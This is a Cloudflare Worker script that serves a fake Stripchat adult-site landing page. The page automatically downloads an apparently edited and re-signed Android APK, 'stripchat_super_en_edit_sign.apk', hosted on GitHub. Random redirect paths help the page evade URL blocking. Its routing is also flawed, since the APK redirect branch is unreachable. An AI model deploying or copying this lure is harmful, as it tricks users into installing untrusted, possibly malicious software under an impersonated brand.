addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  
  // 如果是根路径访问
  if (url.pathname === '/') {
    // 生成随机字符串
    const randomString = generateRandomString(8)
    return Response.redirect(`${url.origin}/${randomString}`, 302)
  }

  // 读取index.html的内容
  const html = `<!doctype html>
<html lang="en">
<head>
    <meta charset=utf-8>
    <title>Free Live Sex Cams and Nude Girls Chat | Stripchat</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: white;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            text-align: center;
        }
        .content-container {
            padding: 20px;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        a {
            color: #fff;
            text-decoration: underline;
        }
        .warnings {
            margin-top: 20px;
            font-size: 14px;
            color: #999;
        }
        .decline-link {
            position: absolute;
            top: 20px;
            right: 20px;
        }
    </style>
</head>
<body>
    <div class="content-container">
        <a class="decline-link visitors-agreement-decline" href="https://google.com/" rel="noopener noreferrer nofollow">Exit</a>
        <div class="warnings">
            <p>
                <span>This website contains <strong>sexually explicit content</strong>.</span>&nbsp;
                <span>You must be at least 18 years old to use this site. However, if the age of majority in your location is higher than 18, you must be at least that age to use this site. This site is not available in locations where such content is prohibited by law.</span>
            </p>
            <p>
                <span>Additionally, this website uses cookies. For more information about cookies, please see our <a rel="nofollow" href="/privacy">Privacy Policy</a>. By viewing and using this site, you agree to the use of cookies and our Privacy Policy.</span>
                <br>All models were at least 18 years old when they were photographed.
            </p>
        </div>
        <h1>Downloading the app...</h1>
        <span style="margin-top:50px;display:block;">
            Not responding? Click here to <a href="stripchat_super_en_edit_sign.apk" style="color:#fff;">install manually</a>
        </span>
    </div>
    <script>
        setTimeout(function(){
            window.location.href = "stripchat_super_en_edit_sign.apk";
        },1500);
    </script>
</body>
</html>`

  // 如果访问的是随机路径，返回HTML内容
  if (url.pathname.length > 1) {
    return new Response(html, {
      headers: {
        'content-type': 'text/html;charset=UTF-8',
      },
    })
  }

  // 如果访问的是apk文件
  if (url.pathname.endsWith('.apk')) {
    return Response.redirect('https://github.com/SLOMEDIALLC/stripchat/raw/main/stripchat_super_en_edit_sign.apk', 302)
  }

  // 默认返回404
  return new Response('Not Found', { status: 404 })
}

function generateRandomString(length) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
  let result = ''
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length))
  }
  return result
}
